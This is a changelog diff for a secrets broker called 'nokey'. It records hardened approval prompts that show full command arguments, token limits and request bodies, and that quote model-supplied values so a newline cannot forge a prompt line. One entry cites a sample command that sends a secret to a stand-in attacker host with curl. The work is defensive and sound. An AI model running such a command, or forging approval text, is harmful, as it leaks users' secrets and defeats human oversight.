@@ -90,6 +90,20 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `for: gh` that used to work with `github_api` and the other `github_*`
   tools is now refused. Mint it `for: nokey:integration:github` (or
   `*`) instead.
+- Approval prompts now show what is being approved, not just a command
+  name. `exec` and `exec_with_secrets` list the arguments (quoted, with
+  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes), so
+  `curl https://attacker.example -H "X: ${{NOKEY:KEY}}"` no longer reads
+  as a plain "curl wants KEY". `mint_token` shows the requested `for`,
+  TTL and max uses, the auto-minted session token is described as
+  "unlimited uses, 1h, any command", and integration tools show the
+  request method, path and body. Every model-supplied value in a prompt is
+  quoted and capped, so a newline in it can't forge a line of the
+  prompt.
+- `mint_token` validates the TTL, `max_uses`, the `for` pattern and that
+  every named secret exists before prompting, and `exec_with_secrets`
+  checks its placeholder secrets exist before prompting, so the user is
+  never asked to approve a request that is going to fail.
 
 ### Added
 - `nokey import --dry-run FILE` parses the file and lists the secret
